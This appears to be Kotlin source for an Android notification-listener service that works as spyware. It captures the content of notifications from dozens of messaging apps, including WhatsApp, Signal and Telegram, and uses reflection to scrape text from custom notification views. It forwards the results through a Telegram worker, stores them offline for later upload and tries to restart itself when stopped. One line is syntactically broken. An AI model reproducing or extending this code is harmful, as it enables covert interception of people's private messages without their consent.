package com.onodnawij.siga

import android.app.Notification
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.widget.RemoteViews
import androidx.work.Data
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class NotificationService : NotificationListenerService() {

    private val allowedApps = setOf(
        "com.whatsapp", "org.telegram.messenger", "org.thoughtcrime.securesms", "com.facebook.orca",
        "com.facebook.katana", "com.instagram.android", "com.snapchat.android", "com.tencent.mm", "jp.naver.line.android",
        "com.viber.voip", "com.discord", "com.google.android.apps.messaging", "com.samsung.android.messaging",
        "com.android.mms", "com.truecaller", "com.Slack", "com.microsoft.teams", "com.google.android.apps.dynamite",
        "com.skype.raider", "us.zoom.videomeetings", "tv.twitch.android.app", "com.reddit.frontpage",
        "com.valvesoftware.android.steam.community", "com.kakao.talk", "com.zing.zalo", "com.imo.android.imoim",
        "com.miui.messaging", "com.coloros.sms", "com.vivo.messaging", "com.asus.message",
        "com.lge.messaging", "com.htc.sense.mms", "com.huawei.message", "com.twitter.android"
    )

    override fun onCreate() {
        super.onCreate()
        triggerTelegramWorker("NotificationService started")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            val packageName = it.packageName
            if (packageName == "com.onodnawij.siga" || !allowedApps.contains(packageName)) return

            val notification = it.notification
            val extras = notification.extras
            val label = getAppLabelOrPackage(packageName)
            
            // First try the standard way to get title and text
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            
            // If we have normal content, use it
            if (title.isNotEmpty() || text.isNotEmpty()) {
                val logEntry = "[$label]\nNotif: $title: $text"
                sendNotificationContent(logEntry)
                return
            }
            
            // Try to extract content from custom view
            val contentView = notification.contentView
            val bigContentView = notification.bigContentView
            val headsUpContentView = notification.headsUpContentView
            
            if (contentView != null || bigContentView != null || headsUpContentView != null) {
                val customViewContent = extractCustomViewContent(
                    contentView ?: bigContentView ?: headsUpContentView
                )
                
                if (customViewContent.isNotEmpty()) {
                    val logEntry = "[$label] Custom View Content:\n$customViewContent"
                    sendNotificationContent(logEntry)
                    return
                }
            }
            
            // If we couldn't extract content, dump all metadata
            val metadataDump = StringBuilder()
            metadataDump.append("[$label] Metadata dump:\n")
            for (key in extras.keySet()) {
                val value = extras.get(key)
                metadataDump.append("$key: $value (${value?.javaClass?.simpleName})\n")
            }

            // Try MediaSession metadata if present
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val token = extras.getParcelable<android.media.session.MediaSession.Token>("android.mediaSession")
                token?.let {
                    try {
                        val controller = android.media.session.MediaController(applicationContext, it)
                        val metadata = controller.metadata
                        metadata?.let { meta ->
                            metadataDump.append("Media Metadata:\n")
                            val keys = listOf(
                                android.media.MediaMetadata.METADATA_KEY_TITLE,
                                android.media.MediaMetadata.METADATA_KEY_ARTIST,
                                android.media.MediaMetadata.METADATA_KEY_ALBUM,
                                android.media.MediaMetadata.METADATA_KEY_DISPLAY_TITLE
                            )
                            keys.forEach { k ->
                                metadataDump.append("$k: ${meta.getString(k)}\n")
                            }
                        }
                    } catch (e: Exception) {
                        metadataDump.append("MediaController error: ${e.message}\n")
                    }
                }
            }

            val logEntry = metadataDump.toString()
            sendNotificationContent(logEntry)
        }
    }
    
    private fun extractCustomViewContent(remoteViews: RemoteViews?): String {
        if (remoteViews == null) return ""
        
        try {
            // Use reflection to access the actions field of RemoteViews
            val actionsField = RemoteViews::class.java.getDeclaredField("mActions")
            actionsField.isAccessible = true
            val actions = actionsField.get(remoteViews) as ArrayList<*>
            
            val textContent = StringBuilder()
            
            // Iterate through actions to find setText actions which contain text
            for (action in actions) {
                val actionClass = action?.javaClass
                // Look for setText actions
                if (actionClass?.simpleName == "SetTextAction" || 
                    (actionClass?.simpleName == "ReflectionAction" && 
                    actionClass.getDeclaredField("methodName").apply { isAccessible = true }.get(action) == "setText")) {
                    
                    // Extract the text value
                    val valueField = actionClass.getDeclaredField("value")
                    valueField.isAccessible = true
                    val text = valueField.get(action)?.toString() ?: continue
                    
                    if (text.isNotEmpty() && !text.matches(Regex("^\\d+$")) && text.length > 1) {
                        textContent.append("$text\n")
                    }
                }
            }
            
            return textContent.toString().trim()
        } catch (e: Exception) {
            Log.e("Siga.NotificationService", "Error extracting custom view content: ${e.message}")
            return "Error extracting custom view: ${e.message}"
        }
    }
    
    private fun sendNotificationContent(logEntry: String) {
        if (isInternetAvailable()) {
            triggerTelegramWorker(logEntry)
            triggerFileUploadWorker()
        } else {
            dumpLogOffline(logEntry)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        triggerTelegramWorker("NotificationService destroyed")
        sendRestartBroadcast()
    }

    private fun sendRestartBroadcast() {
        sendBroadcast(Intent("com.onodnawij.siga.RESTART_NOTIFICATIONSERVICE"))
    }

    private fun triggerTelegramWorker(logEntry: String) {
        val inputData = Data.Builder()
            .putString("logEntry", logEntry)
            .build()

        val request = OneTimeWorkRequest.Builder(TelegramWorker::class.java)
            .setInputData(inputData)
            .build()

        WorkManager.getInstance(applicationContext).enqueue(request)
        Log.d("Siga.NotificationService", "Telegram worker triggered")
    }

    private fun triggerFileUploadWorker() {
        val logFile = getOfflineLogFile()
        if (logFile.exists()) {
            val fileUploadWork = OneTimeWorkRequest.Builder(TelegramWorker::class.java)
                .setInputData(Data.Builder().putString("filePath", .absolutePath).build())
                .build()
            WorkManager.getInstance(applicationContext).enqueue(fileUploadWork)
        }
    }

    private fun dumpLogOffline(logEntry: String) {
        val file = getOfflineLogFile()
        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        val log = "[$timestamp]\n$logEntry\n"
        file.appendText(log)
        Log.d("Siga.NotificationService", "Offline log dumped")
    }

    private fun getOfflineLogFile(): File {
        val dir = File(applicationContext.filesDir, "siga_logs")
        if (!dir.exists()) dir.mkdirs()
        return File(dir, "siga_offline_log.txt")
    }

    private fun isInternetAvailable(): Boolean {
        val cm = getSystemService(ConnectivityManager::class.java)
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun getAppLabelOrPackage(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
}